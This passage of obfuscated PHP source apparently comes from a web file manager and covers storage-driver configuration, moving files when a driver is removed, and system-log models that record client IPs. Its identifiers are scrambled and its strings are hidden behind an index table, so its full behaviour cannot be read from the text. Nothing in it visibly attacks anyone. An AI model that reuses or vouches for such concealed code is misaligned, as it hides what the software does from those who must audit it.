$î››ò = $ÆÎ„æª[$ƒ„¥Ìƒ]; $”Ú¤ïş = $î¢…ê„–[$ƒ„¥Ìƒ]; if ($”Ú¤ïş == str_repeat($Œï†Ó˜Ã[198], strlen($î››ò))) { $î¢…ê„–[$ƒ„¥Ìƒ] = $î››ò; $èåĞ¦”Ö[$Œï†Ó˜Ã[16]] = json_encode($î¢…ê„–); } else { if ($”Ú¤ïş != $î››ò) { $èåĞ¦”Ö[$Œï†Ó˜Ã[2163]] = $Œï†Ó˜Ã[98]; } } } public function checkConfig(&$¥Ÿ½é , $”æ”Î®Š = false) { $­æŸø‡ó =& $_SERVER[¹Û¹Æ€]; $é×†ùÀ¶ = strtolower($¥Ÿ½é [$­æŸø‡ó[105]]); $ŞÑØàª¢ = json_decode($¥Ÿ½é [$­æŸø‡ó[16]], !0); foreach ($ŞÑØàª¢ as $ê¢·¿ğ« => $é¦‹ÎÏô) { $ŞÑØàª¢[$ê¢·¿ğ«] = trim($é¦‹ÎÏô); } $ŞÑØàª¢[$­æŸø‡ó[2166]] = rand_string(6); $‹®¯ˆÌ¢ = $GLOBALS[$­æŸø‡ó[16]][$­æŸø‡ó[99]][$­æŸø‡ó[824]]; $º˜ù‚«æ = isset($‹®¯ˆÌ¢[$é×†ùÀ¶]) ? $‹®¯ˆÌ¢[$é×†ùÀ¶] : ucfirst($é×†ùÀ¶); $Ğ¦óÎÅ¹ = $­æŸø‡ó[84] . $º˜ù‚«æ; if (!$º˜ù‚«æ || !class_exists($Ğ¦óÎÅ¹)) { if ($”æ”Î®Š) { return LNG($­æŸø‡ó[2167]); } write_log(array($­æŸø‡ó[2168], $¥Ÿ½é , get_caller_info()), $­æŸø‡ó[2169]); show_json(LNG($­æŸø‡ó[2167]), !1, $¥Ÿ½é ); } $Ïó²³›ò = new $Ğ¦óÎÅ¹($ŞÑØàª¢); if (in_array($é×†ùÀ¶, $Ïó²³›ò->objectDriver)) { if (!$Ïó²³›ò->isBucketCors() && !$Ïó²³›ò->setBucketCors()) { $ŠÅÑ¼àÚ = LNG($­æŸø‡ó[2170]); $ŠÅÑ¼àÚ .= $­æŸø‡ó[2171] . LNG($­æŸø‡ó[2172]); if ($”æ”Î®Š) { return $ŠÅÑ¼àÚ; } show_json($ŠÅÑ¼àÚ, !1); } } $èä•Û½ä = rtrim($ŞÑØàª¢[$­æŸø‡ó[1178]], $­æŸø‡ó[18]) . $­æŸø‡ó[18]; $Š÷ë‡„ = $Ïó²³›ò->getPath($èä•Û½ä . $­æŸø‡ó[1182]); if (!$Ïó²³›ò->mkfile($Š÷ë‡„)) { if ($”æ”Î®Š) { return LNG($­æŸø‡ó[2170]); } show_json(LNG($­æŸø‡ó[2170]), !1); } $ŞÑØàª¢[$­æŸø‡ó[1178]] = $èä•Û½ä; $¥Ÿ½é [$­æŸø‡ó[16]] = json_encode($ŞÑØàª¢); $¥Ÿ½é [$­æŸø‡ó[105]] = $º˜ù‚«æ; return !0; } public function driverListSystem() { $ùŸó¨èö =& $_SERVER[¹Û¹Æ€]; $É¡Ö±¹Ë = parent::listData(); $ø°•Çµ¼ = array(); foreach ($É¡Ö±¹Ë as $ëç¥›£®) { unset($ëç¥›£®[$ùŸó¨èö[210]], $ëç¥›£®[$ùŸó¨èö[95]]); $ëç¥›£®[$ùŸó¨èö[16]] = json_decode($ëç¥›£®[$ùŸó¨èö[16]], !0); $ø°•Çµ¼[] = $ëç¥›£®; } return $ø°•Çµ¼; } public function defaultDriver() { $¦•´Á¹ì =& $_SERVER[¹Û¹Æ€]; $‡Ä·¸Ùë = parent::listData(); $¡«½ÙèÏ = array_filter_by_field($‡Ä·¸Ùë, $¦•´Á¹ì[47], 1); $¡«½ÙèÏ = $¡«½ÙèÏ[0]; if ($¡«½ÙèÏ) { $¡«½ÙèÏ[$¦•´Á¹ì[16]] = json_decode($¡«½ÙèÏ[$¦•´Á¹ì[16]], !0); } return $¡«½ÙèÏ; } public function driverInfo($ˆ´ŒÒ¬®) { $È ³íŠ¦ =& $_SERVER[¹Û¹Æ€]; $€¤íÕ»” = array_to_keyvalue(parent::listData(), $È ³íŠ¦[408]); if (!isset($€¤íÕ»”[$ˆ´ŒÒ¬®])) { return !1; } $Õûû›Ò = $€¤íÕ»”[$ˆ´ŒÒ¬®]; $Õûû›Ò[$È ³íŠ¦[16]] = json_decode($Õûû›Ò[$È ³íŠ¦[16]], !0); return $Õûû›Ò; } public function remove($ïä¼Àé) { $this->removeShareItems($ïä¼Àé); return parent::remove($ïä¼Àé); } public function removeWithFile($Üûì­ñø, $‘³üùšÉ) { $ØàÜÉÕ¨ =& $_SERVER[¹Û¹Æ€]; $ÍÍ¸äÔ© = array($ØàÜÉÕ¨[815] => $Üûì­ñø); $òô–®ÒÊ = Model($ØàÜÉÕ¨[480])->where($ÍÍ¸äÔ©)->count(); $á£Å”œÍ = Model($ØàÜÉÕ¨[480])->where($ÍÍ¸äÔ©)->sum($ØàÜÉÕ¨[86]); $„ûâÊ½ = $‘³üùšÉ . $ØàÜÉÕ¨[2173] . $Üûì­ñø; $ÁîåÅ« = LNG($‘³üùšÉ == $ØàÜÉÕ¨[566] ? $ØàÜÉÕ¨[2174] : $ØàÜÉÕ¨[2175]); $†Áª¿©é = new TaskFileTransfer($„ûâÊ½, $ØàÜÉÕ¨[2169], $òô–®ÒÊ, $ÁîåÅ« . "\50{$Üûì­ñø}\51"); $†Áª¿©é->task[$ØàÜÉÕ¨[761]] = (double) $á£Å”œÍ; $õÁÜ¤”Ú = KodIO::defaultDriver(); $ôûÆ¥×® = $õÁÜ¤”Ú[$ØàÜÉÕ¨[408]]; $”œÇüÛı = "\173\151\x6f\x3a{$ôûÆ¥×®}\175\x2f"; $Ø¢„”ˆ§ = !0; $‰€Ğ“†Š = array(); $ùæ÷Œ§© = Model($ØàÜÉÕ¨[209])->where($ÍÍ¸äÔ©)->field($ØàÜÉÕ¨[2176])->select(); foreach ($ùæ÷Œ§© as $¿´Ÿô„¥) { $ÍÙÄÆó½ = $¿´Ÿô„¥[$ØàÜÉÕ¨[94]]; $˜ˆ„ƒ = $”œÇüÛı . str_replace("\x7b\x69\157\x3a{$Üûì­ñø}\x7d\57", $ØàÜÉÕ¨[22], $ÍÙÄÆó½); if (!IO::exist($ÍÙÄÆó½)) { $‰€Ğ“†Š[] = $¿´Ÿô„¥[$ØàÜÉÕ¨[477]]; $†Áª¿©é->updateFileEnd($¿´Ÿô„¥[$ØàÜÉÕ¨[42]], $¿´Ÿô„¥[$ØàÜÉÕ¨[86]]); continue; } if (IO::exist($˜ˆ„ƒ)) { $†Áª¿©é->updateFileEnd($¿´Ÿô„¥[$ØàÜÉÕ¨[42]], $¿´Ÿô„¥[$ØàÜÉÕ¨[86]]); continue; } if (!IO::move($ÍÙÄÆó½, get_path_father($˜ˆ„ƒ))) { $Ø¢„”ˆ§ = !1; break; } $ÍÍ¸äÔ© = array($ØàÜÉÕ¨[477] => $¿´Ÿô„¥[$ØàÜÉÕ¨[477]]); $Ó‰®€ª = array($ØàÜÉÕ¨[815] => $ôûÆ¥×®, $ØàÜÉÕ¨[94] => $˜ˆ„ƒ); Model($ØàÜÉÕ¨[209])->where($ÍÍ¸äÔ©)->save($Ó‰®€ª); } $this->removeByFileID($‰€Ğ“†Š); if (!$Ø¢„”ˆ§) { $†Áª¿©é->stop($„ûâÊ½); return !1; } $†Áª¿©é->end(); if ($‘³üùšÉ == $ØàÜÉÕ¨[1818]) { $this->remove($Üûì­ñø); } } public function progress($Ÿ°ÈÊ, $Ÿí¹ó¢) { return Task::get($Ÿí¹ó¢ . $_SERVER[¹Û¹Æ€][2173] . $Ÿ°ÈÊ); } private function removeByFileID($˜üªı·¤ = array()) { $áĞ†²ù =& $_SERVER[¹Û¹Æ€]; if (empty($˜üªı·¤)) { return; } $–¶®ûš = array($áĞ†²ù[477] => array($áĞ†²ù[17], $˜üªı·¤)); $Ã»œÊ§ş = Model($áĞ†²ù[1333])->where($–¶®ûš)->field($áĞ†²ù[411])->select(); if (!$Ã»œÊ§ş) { return; } $Ã»œÊ§ş = array_to_keyvalue($Ã»œÊ§ş, $áĞ†²ù[22], $áĞ†²ù[411]); foreach ($Ã»œÊ§ş as $ş¢Óü×¡) { Model($áĞ†²ù[425])->removeNow($ş¢Óü×¡, !1); } } private function removeShareItems($¯•êÌïæ) { $Ş–ùãø¥ =& $_SERVER[¹Û¹Æ€]; $Ê¿¡Û¼® = "\x7b\x69\157\72{$¯•êÌïæ}\x7d\x2f"; $ê²á‰ûÔ = array($Ş–ùãø¥[411] => 0, $Ş–ùãø¥[1173] => array($Ş–ùãø¥[392], "{$Ê¿¡Û¼®}\x25")); $€êåª = Model($Ş–ùãø¥[1829])->where($ê²á‰ûÔ)->field($Ş–ùãø¥[498])->select(); if (empty($€êåª)) { return; } $ú×Êç¸¨ = array_to_keyvalue($€êåª, $Ş–ùãø¥[22], $Ş–ùãø¥[498]); Model($Ş–ùãø¥[610])->remove($ú×Êç¸¨); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\114\151\147\x68\x74\x41\160\160"; public $modelType = "\x53\171\163\x74\145\x6d\x4f\x70\x74\x69\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\147\x72\x6f\x75\160", "\144\145\163\x63", "\143\x6f\156\x74\x65\x6e\x74"); public function listData($Íã›´äº = false, $É¡·ëîé = "\155\x6f\144\151\146\x79\124\x69\x6d\x65", $Ç¹ÀËªó = true) { return parent::listData($Íã›´äº, $É¡·ëîé, $Ç¹ÀËªó); } public function remove($´­ü·É) { $ĞŠ÷°‘ü = $this->findByName($´­ü·É); if (!$ĞŠ÷°‘ü) { return !1; } return parent::remove($ĞŠ÷°‘ü[$_SERVER[¹Û¹Æ€][408]]); } public function add($©¨åË›) { if ($this->findByName($©¨åË›[$_SERVER[¹Û¹Æ€][42]])) { return !1; } return parent::insert($©¨åË›); } public function update($¾³¼á«, $”ğ¥ùá) { $²Í¨¼ÇÏ =& $_SERVER[¹Û¹Æ€]; $ÍĞŞ£â§ = $this->findByName($¾³¼á«); $äÄÄş = $this->findByName($”ğ¥ùá[$²Í¨¼ÇÏ[42]]); if (!$ÍĞŞ£â§ || $äÄÄş && $äÄÄş[$²Í¨¼ÇÏ[408]] != $ÍĞŞ£â§[$²Í¨¼ÇÏ[408]]) { return !1; } return parent::update($ÍĞŞ£â§[$²Í¨¼ÇÏ[408]], $”ğ¥ùá); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\155\x5f\154\157\147"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\124\151\x6d\x65", "\x74\151\x6d\145", "\x69\x6e\163\145\x72\x74", "\146\165\x6e\143\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¬Ë‡å—² =& $_SERVER[¹Û¹Æ€]; return array($¬Ë‡å—²[2177] => LNG($¬Ë‡å—²[2178]), $¬Ë‡å—²[2179] => LNG($¬Ë‡å—²[2180]), $¬Ë‡å—²[1792] => LNG($¬Ë‡å—²[2181]), $¬Ë‡å—²[2182] => LNG($¬Ë‡å—²[2183]), $¬Ë‡å—²[2184] => LNG($¬Ë‡å—²[2185]), $¬Ë‡å—²[2186] => LNG($¬Ë‡å—²[2187]), $¬Ë‡å—²[2188] => LNG($¬Ë‡å—²[2189]), $¬Ë‡å—²[1822] => LNG($¬Ë‡å—²[2189]), $¬Ë‡å—²[1823] => LNG($¬Ë‡å—²[2190]), $¬Ë‡å—²[2191] => LNG($¬Ë‡å—²[2192]), $¬Ë‡å—²[2193] => LNG($¬Ë‡å—²[2194]), $¬Ë‡å—²[2195] => LNG($¬Ë‡å—²[2196]), $¬Ë‡å—²[2197] => LNG($¬Ë‡å—²[2198]), $¬Ë‡å—²[1820] => LNG($¬Ë‡å—²[2199]), $¬Ë‡å—²[2200] => LNG($¬Ë‡å—²[2201]), $¬Ë‡å—²[1827] => LNG($¬Ë‡å—²[2202]), $¬Ë‡å—²[2203] => LNG($¬Ë‡å—²[2204]), $¬Ë‡å—²[2205] => LNG($¬Ë‡å—²[2206]), $¬Ë‡å—²[2207] => LNG($¬Ë‡å—²[2208]), $¬Ë‡å—²[2209] => LNG($¬Ë‡å—²[2210]), $¬Ë‡å—²[1830] => LNG($¬Ë‡å—²[2211]), $¬Ë‡å—²[1831] => LNG($¬Ë‡å—²[2212]), $¬Ë‡å—²[2213] => LNG($¬Ë‡å—²[2214]), $¬Ë‡å—²[2215] => LNG($¬Ë‡å—²[2216]), $¬Ë‡å—²[2217] => LNG($¬Ë‡å—²[2218]), $¬Ë‡å—²[1825] => LNG($¬Ë‡å—²[2219]), $¬Ë‡å—²[2220] => LNG($¬Ë‡å—²[2221]), $¬Ë‡å—²[1824] => LNG($¬Ë‡å—²[2222]), $¬Ë‡å—²[2223] => LNG($¬Ë‡å—²[2224]), $¬Ë‡å—²[2225] => LNG($¬Ë‡å—²[2226]), $¬Ë‡å—²[2227] => LNG($¬Ë‡å—²[2228]), $¬Ë‡å—²[2229] => LNG($¬Ë‡å—²[2229]), $¬Ë‡å—²[2230] => LNG($¬Ë‡å—²[1796]), $¬Ë‡å—²[2231] => LNG($¬Ë‡å—²[2232]), $¬Ë‡å—²[2233] => LNG($¬Ë‡å—²[2234]), $¬Ë‡å—²[2235] => LNG($¬Ë‡å—²[2236]), $¬Ë‡å—²[2237] => LNG($¬Ë‡å—²[2238]), $¬Ë‡å—²[2239] => LNG($¬Ë‡å—²[2240]), $¬Ë‡å—²[2241] => LNG($¬Ë‡å—²[2241]), $¬Ë‡å—²[2242] => LNG($¬Ë‡å—²[2243]), $¬Ë‡å—²[2244] => LNG($¬Ë‡å—²[2245]), $¬Ë‡å—²[2246] => LNG($¬Ë‡å—²[2247]), $¬Ë‡å—²[2248] => LNG($¬Ë‡å—²[2249]), $¬Ë‡å—²[2250] => LNG($¬Ë‡å—²[2251]), $¬Ë‡å—²[2252] => LNG($¬Ë‡å—²[2253])); } private function typeFile() { $áËóŸñ =& $_SERVER[¹Û¹Æ€]; $“‡ Èí = array($áËóŸñ[1827] => array($áËóŸñ[1828]), $áËóŸñ[2195] => array($áËóŸñ[2254]), $áËóŸñ[2197] => array($áËóŸñ[2255]), $áËóŸñ[1820] => array($áËóŸñ[1821]), $áËóŸñ[2205] => array(), $áËóŸñ[2207] => array(), $áËóŸñ[2209] => array(), $áËóŸñ[1830] => array($áËóŸñ[1832]), $áËóŸñ[1831] => array($áËóŸñ[1832]), $áËóŸñ[2213] => array($áËóŸñ[2256]), $áËóŸñ[2215] => array($áËóŸñ[2256]), $áËóŸñ[2217] => array($áËóŸñ[2257]), $áËóŸñ[2203] => array($áËóŸñ[2258]), $áËóŸñ[1825] => array($áËóŸñ[2259]), $áËóŸñ[2220] => array($áËóŸñ[2260]), $áËóŸñ[1824] => array($áËóŸñ[1826])); return $“‡ Èí; } private function typeAll() { $ë¢³àıÁ =& $_SERVER[¹Û¹Æ€]; $Ç‘Á³³… = $this->typeList; $Ë”Ş¨¹ä = array_filter($this->typeFile()); foreach ($Ë”Ş¨¹ä as $Ö®ÔıÆ‰ => $­ÏÇˆİ¦) { $Ç‘Á³³…[$­ÏÇˆİ¦[0]] = $Ç‘Á³³…[$Ö®ÔıÆ‰]; } $Ç‘Á³³…[$ë¢³àıÁ[1832]] = LNG($ë¢³àıÁ[2261]); $Ç‘Á³³…[$ë¢³àıÁ[2256]] = LNG($ë¢³àıÁ[2262]); return $Ç‘Á³³…; } public function addLog($Ö¢ÒÅä©, $´İ”Òèõ = array()) { $´ô­İ·² =& $_SERVER[¹Û¹Æ€]; if (!isset($this->typeList[$Ö¢ÒÅä©])) { return; } $Ãş†Á = defined($´ô­İ·²[484]) && USER_ID ? USER_ID : (isset($´İ”Òèõ[$´ô­İ·²[1659]]) ? $´İ”Òèõ[$´ô­İ·²[1659]] : 0); if (!$Ãş†Á) { $Ãş†Á = (int) Session::get($´ô­İ·²[1986]); } if ($Ö¢ÒÅä© == $´ô­İ·²[2231] && is_array($´İ”Òèõ[$´ô­İ·²[2263]]) && !$´İ”Òèõ[$´ô­İ·²[2263]]) { return; } $’¼†…÷„ = get_client_ip(); if (!$´İ”Òèõ || strlen(json_encode($´İ”Òèõ)) >= 1024) { $´İ”Òèõ = array($´ô­İ·²[2264] => $’¼†…÷„); } else { if (is_array($´İ”Òèõ)) { $´İ”Òèõ[$´ô­İ·²[2264]] = $’¼†…÷„; } else { $´İ”Òèõ = array($´ô­İ·²[1200] => $´İ”Òèõ, $´ô­İ·²[2264] => $’¼†…÷„); } } $´İ”Òèõ = array($´ô­İ·²[1649] => Session::sign(), $´ô­İ·²[1650] => $Ãş†Á, $´ô­İ·²[43] => $Ö¢ÒÅä©, $´ô­İ·²[1652] => json_encode($´İ”Òèõ)); parent::add($´İ”Òèõ); } public function remove($«ÌÃ§) { $this->where(array($_SERVER[¹Û¹Æ€][428] => $«ÌÃ§))->delete(); } private function _makeOrder($îªØ‹Óª = '') { $Ç€Šâ’Ù =& $_SERVER[¹Û¹Æ€]; $¸èñáèû = $Ç€Šâ’Ù[210]; $¶®’³‰Å = array($Ç€Šâ’Ù[459] => $Ç€Šâ’Ù[460], $Ç€Šâ’Ù[461] => $Ç€Šâ’Ù[462]); $Ñ¾´Öµ = Input::get($Ç€Šâ’Ù[467], $Ç€Šâ’Ù[17], $Ç€Šâ’Ù[2018], array($Ç€Šâ’Ù[1940], $Ç€Šâ’Ù[461])); $Ñ¾´Öµ = $¶®’³‰Å[$Ñ¾´Öµ]; $îªØ‹Óª = $îªØ‹Óª . "{$¸èñáèû}\x20{$Ñ¾´Öµ}"; return $this->order($îªØ‹Óª); } public function get($ô¡ÑÈˆ = '') { $şæİî´ƒ =& $_SERVER[¹Û¹Æ€]; if (!$ô¡ÑÈˆ) { show_json(array()); } $•ıŒõ½© = array(); if ($ô¡ÑÈˆ[$şæİî´ƒ[1659]]) { $•ıŒõ½©[$şæİî´ƒ[1659]] = $ô¡ÑÈˆ[$şæİî´ƒ[1659]]; } if (isset($ô¡ÑÈˆ[$şæİî´ƒ[759]])) { $Š™«üÉ¤ = $ô¡ÑÈˆ[$şæİî´ƒ[759]]; $Ü’™ù¿Ş = isset($ô¡ÑÈˆ[$şæİî´ƒ[506]]) ? $ô¡ÑÈˆ[$şæİî´ƒ[506]] : time(); $•ıŒõ½©[$şæİî´ƒ[210]] = array($şæİî´ƒ[342], array($Š™«üÉ¤, $Ü’™ù¿Ş)); } if ($ô¡ÑÈˆ[$şæİî´ƒ[43]]) { $”•†îïô = explode($şæİî´ƒ[60], $ô¡ÑÈˆ[$şæİî´ƒ[43]]); $ª‰Á×®ã = $this->typeFile(); $²„ÌÄ¡ = array(); foreach ($”•†îïô as $ò†â¾) { $²„ÌÄ¡[] = $ò†â¾; if (isset($ª‰Á×®ã[$ò†â¾])) { $²„ÌÄ¡ = array_merge($²„ÌÄ¡, $ª‰Á×®ã[$ò†â¾]); } } $²„ÌÄ¡ = array_unique($²„ÌÄ¡); if ($²„ÌÄ¡) { $•ıŒõ½©[$şæİî´ƒ[43]] = array($şæİî´ƒ[17], $²„ÌÄ¡); } } else { $•ıŒõ½©[$şæİî´ƒ[43]] = array($şæİî´ƒ[2265], $şæİî´ƒ[2266]); } if (!empty($ô¡ÑÈˆ[$şæİî´ƒ[2264]])) { $•ıŒõ½©[$şæİî´ƒ[462]] = array($şæİî´ƒ[392], "\45{$ô¡ÑÈˆ[$şæİî´ƒ[2264]]}\45"); } $ğÒÃÌî“ = $this->_makeOrder()->where($•ıŒõ½©)->selectPage(); if (empty($ğÒÃÌî“[$şæİî´ƒ[378]])) { show_json(array(), !0, $ğÒÃÌî“[$şæİî´ƒ[375]]); } $ğÒÃÌî“[$şæİî´ƒ[378]] = $this->logList($ğÒÃÌî“[$şæİî´ƒ[378]]); return $ğÒÃÌî“; } private function ipAddress(&$û’ÆˆÙ) { $û·òÁº  =& $_SERVER[¹Û¹Æ€]; if (!empty($û’ÆˆÙ[$û·òÁº [2264]])) { $—º€¾Ó“ = IpLocation::get($û’ÆˆÙ[$û·òÁº [2264]]); } else { $—º€¾Ó“ = LNG($û·òÁº [2267]); } $û’ÆˆÙ[$û·òÁº [2268]] = $—º€¾Ó“; } private function descZipDownload($¹¬ÎÃ•¾, &$ŒûÈ‘ûê) { $Ã»â€Ë³ =& $_SERVER[¹Û¹Æ€]; if (!isset($¹¬ÎÃ•¾[$Ã»â€Ë³[2269]])) { return; } $úôÔÚê = json_decode($¹¬ÎÃ•¾[$Ã»â€Ë³[2269]], !0); foreach ($úôÔÚê as $Ô‘öÌì¼) { try { $öñ§´Â¬ = IO::infoFull($Ô‘öÌì¼[$Ã»â€Ë³[94]]); } catch (Exception $™”û×³¬) { continue; } $¹¬ÎÃ•¾[$Ã»â€Ë³[94]] = $Ô‘öÌì¼[$Ã»â€Ë³[94]]; $ŒûÈ‘ûê[] = $¹¬ÎÃ•¾[$Ã»â€Ë³[411]] = $öñ§´Â¬[$Ã»â€Ë³[411]]; $ŒûÈ‘ûê[] = $¹¬ÎÃ•¾[$Ã»â€Ë³[2072]] = $öñ§´Â¬[$Ã»â€Ë³[441]]; break; } return $¹¬ÎÃ•¾; } private function getSourceList(&$İ×õüû») { $€³ÙŞı¨ =& $_SERVER[¹Û¹Æ€]; $¡¼Çé¢ı = array(); foreach ($İ×õüû» as $ò–Ç´ïî => $­îš¦¼¿) { $œÓÃ = json_decode($­îš¦¼¿[$€³ÙŞı¨[462]], !0); if ($­îš¦¼¿[$€³ÙŞı¨[43]] == $€³ÙŞı¨[1823]) { $œÓÃ = $this->descZipDownload($œÓÃ, $¡¼Çé¢ı); $İ×õüû»[$ò–Ç´ïî][$€³ÙŞı¨[462]] = json_encode($œÓÃ); continue; } if (strpos($­îš¦¼¿[$€³ÙŞı¨[43]], $€³ÙŞı¨[2074]) !== 0) { if (!isset($œÓÃ[$€³ÙŞı¨[94]]) || strpos($­îš¦¼¿[$€³ÙŞı¨[43]], $€³ÙŞı¨[2270]) !== 0) { continue; } try { $¬Êì¥ã = IO::infoFull($œÓÃ[$€³ÙŞı¨[94]]); } catch (Exception $• İóÑ) { continue; } $¡¼Çé¢ı[] = $œÓÃ[$€³ÙŞı¨[411]] = $¬Êì¥ã[$€³ÙŞı¨[411]]; $¡¼Çé¢ı[] = $œÓÃ[$€³ÙŞı¨[2072]] = $¬Êì¥ã[$€³ÙŞı¨[441]]; $İ×õüû»[$ò–Ç´ïî][$€³ÙŞı¨[462]] = json_encode($œÓÃ); continue; } $¡¼Çé¢ı[] = $œÓÃ[$€³ÙŞı¨[411]]; $¡¼Çé¢ı[] = $œÓÃ[$€³ÙŞı¨[2072]]; if ($œÓÃ[$€³ÙŞı¨[43]] == $€³ÙŞı¨[566]) { $¡¼Çé¢ı[] = $œÓÃ[$€³ÙŞı¨[462]][$€³ÙŞı¨[1157]]; $¡¼Çé¢ı[] = $œÓÃ[$€³ÙŞı¨[462]][$€³ÙŞı¨[1158]]; } if ($œÓÃ[$€³ÙŞı¨[43]] == $€³ÙŞı¨[2082]) { $¡¼Çé¢ı[] = $œÓÃ[$€³ÙŞı¨[462]][$€³ÙŞı¨[411]]; } } if (!$¡¼Çé¢ı) { return array(); } return Model($€³ÙŞı¨[823])->sourceListInfo($¡¼Çé¢ı, !0); } private function logList($ÇÑ¿§¹») { $ÄÓâË¢ =& $_SERVER[¹Û¹Æ€]; $›ÄÛ·ü— = array_to_keyvalue($ÇÑ¿§¹», $ÄÓâË¢[22], $ÄÓâË¢[1659]); $±ÆÙœ« = Model($ÄÓâË¢[544])->userListInfo(array_unique($›ÄÛ·ü—)); $õ‡÷œª = $this->getSourceList($ÇÑ¿§¹»); $Ä¡½©¼ï = $this->typeAll(); $éíå ÜÕ = array(); $œ’Àşù = array(); foreach ($ÇÑ¿§¹» as $§Øñ› => $¥éµ¢È) { $ºÉóıùÀ = $¥éµ¢È[$ÄÓâË¢[43]]; $ßÉâ¡éÖ = isset($±ÆÙœ«[$¥éµ¢È[$ÄÓâË¢[1659]]]) ? $±ÆÙœ«[$¥éµ¢È[$ÄÓâË¢[1659]]] : !1; $¶êÙÃò­ = strpos($ºÉóıùÀ, $ÄÓâË¢[2271]) === 0 ? LNG($ÄÓâË¢[2272]) : LNG($ÄÓâË¢[2267]); $¥éµ¢È[$ÄÓâË¢[42]] = isset($ßÉâ¡éÖ[$ÄÓâË¢[42]]) ? $ßÉâ¡éÖ[$ÄÓâË¢[42]] : LNG($ÄÓâË¢[2267]); $¥éµ¢È[$ÄÓâË¢[551]] = isset($ßÉâ¡éÖ[$ÄÓâË¢[551]]) ? $ßÉâ¡éÖ[$ÄÓâË¢[551]] : $ÄÓâË¢[22]; $¥éµ¢È[$ÄÓâË¢[1559]] = isset($Ä¡½©¼ï[$ºÉóıùÀ]) ? $Ä¡½©¼ï[$ºÉóıùÀ] : $¶êÙÃò­; $¥éµ¢È[$ÄÓâË¢[2017]] = $ßÉâ¡éÖ; $ó–Ÿ¾³ğ = json_decode($¥éµ¢È[$ÄÓâË¢[462]], !0); $¥éµ¢È[$ÄÓâË¢[2264]] = isset($ó–Ÿ¾³ğ[$ÄÓâË¢[2264]]) ? $ó–Ÿ¾³ğ[$ÄÓâË¢[2264]] : $ÄÓâË¢[22]; $¥éµ¢È[$ÄÓâË¢[2268]] = IpLocation::get($¥éµ¢È[$ÄÓâË¢[2264]]); if (strpos($ºÉóıùÀ, $ÄÓâË¢[2074]) === 0 || isset($ó–Ÿ¾³ğ[$ÄÓâË¢[2072]])) { $ó–Ÿ¾³ğ[$ÄÓâË¢[96]] = $õ‡÷œª[$ó–Ÿ¾³ğ[$ÄÓâË¢[411]]]; $ó–Ÿ¾³ğ[$ÄÓâË¢[2087]] = $õ‡÷œª[$ó–Ÿ¾³ğ[$ÄÓâË¢[2072]]]; if ($ó–Ÿ¾³ğ[$ÄÓâË¢[43]] == $ÄÓâË¢[566]) { $ó–Ÿ¾³ğ[$ÄÓâË¢[462]][$ÄÓâË¢[1157]] = $õ‡÷œª[$ó–Ÿ¾³ğ[$ÄÓâË¢[462]][$ÄÓâË¢[1157]]]; $ó–Ÿ¾³ğ[$ÄÓâË¢[462]][$ÄÓâË¢[1158]] = $õ‡÷œª[$ó–Ÿ¾³ğ[$ÄÓâË¢[462]][$ÄÓâË¢[1158]]]; } if ($ó–Ÿ¾³ğ[$ÄÓâË¢[43]] == $ÄÓâË¢[2082]) { $ó–Ÿ¾³ğ[$ÄÓâË¢[462]][$ÄÓâË¢[411]] = $õ‡÷œª[$ó–Ÿ¾³ğ[$ÄÓâË¢[462]][$ÄÓâË¢[411]]]; } if ($ó–Ÿ¾³ğ[$ÄÓâË¢[43]] == $ÄÓâË¢[1818]) { $ó–Ÿ¾³ğ[$ÄÓâË¢[2087]] = $ó–Ÿ¾³ğ[$ÄÓâË¢[96]]; $ó–Ÿ¾³ğ[$ÄÓâË¢[2072]] = $ó–Ÿ¾³ğ[$ÄÓâË¢[2087]][$ÄÓâË¢[411]]; $ó–Ÿ¾³ğ[$ÄÓâË¢[96]] = !1; $ó–Ÿ¾³ğ[$ÄÓâË¢[411]] = $ÄÓâË¢[22]; } if ($ó–Ÿ¾³ğ[$ÄÓâË¢[96]] && $ó–Ÿ¾³ğ[$ÄÓâË¢[96]][$ÄÓâË¢[420]] == $ÄÓâË¢[1282]) { $œ’Àşù[] = $¥éµ¢È[$ÄÓâË¢[408]]; unset($ÇÑ¿§¹»[$§Øñ›]); continue; } if ($ó–Ÿ¾³ğ[$ÄÓâË¢[2087]] && $ó–Ÿ¾³ğ[$ÄÓâË¢[2087]][$ÄÓâË¢[420]] == $ÄÓâË¢[1282]) { $œ’Àşù[] = $¥éµ¢È[$ÄÓâË¢[408]]; unset($ÇÑ¿§¹»[$§Øñ›]); continue; } } $¥éµ¢È[$ÄÓâË¢[462]] = $ó–Ÿ¾³ğ; unset($¥éµ¢È[$ÄÓâË¢[2273]]); $éíå ÜÕ[] = $¥éµ¢È; } $this->clearSystemPathLog($œ’Àşù); return $éíå ÜÕ; } private function clearSystemPathLog($¯Ğª‡ß) { $¦úÁÍÕ =& $_SERVER[¹Û¹Æ€]; if (count($¯Ğª‡ß) == 0) { return; } $’€®óÄ = array($¦úÁÍÕ[408] => array($¦úÁÍÕ[17], array_unique($¯Ğª‡ß))); $this->where($’€®óÄ)->delete(); } public function deviceList($»€›ÙëÃ, $ïØ±©ÅÉ = 0) { $Şõô·¾Í =& $_SERVER[¹Û¹Æ€]; $•×àê´ó = array($Şõô·¾Í[1659] => $»€›ÙëÃ, $Şõô·¾Í[210] => array($Şõô·¾Í[1011], $ïØ±©ÅÉ), $Şõô·¾Í[43] => $Şõô·¾Í[1792]); $®ù¤ã¡­ = array(); $¤Çßãœ÷ = $this->field($Şõô·¾Í[2274])->where($•×àê´ó)->order($Şõô·¾Í[2085])->limit(50)->select(); foreach ($¤Çßãœ÷ as $üÎÒ÷äÓ => $ò€‘‘í) { if ($üÎÒ÷äÓ > 0 && abs($ò€‘‘í[$Şõô·¾Í[210]] - $¤Çßãœ÷[$üÎÒ÷äÓ - 1][$Şõô·¾Í[210]]) < 5) { continue; } $¬Î’äñ® = json_decode($ò€‘‘í[$Şõô·¾Í[462]], !0); $ò€‘‘í[$Şõô·¾Í[2264]] = isset($¬Î’äñ®[$Şõô·¾Í[2264]]) ? $¬Î’äñ®[$Şõô·¾Í[2264]] : $Şõô·¾Í[22]; unset($¬Î’äñ®[$Şõô·¾Í[2264]]); $úº¦µµ˜ = $this->deviceType($¬Î’äñ®[$Şõô·¾Í[2075]]); if 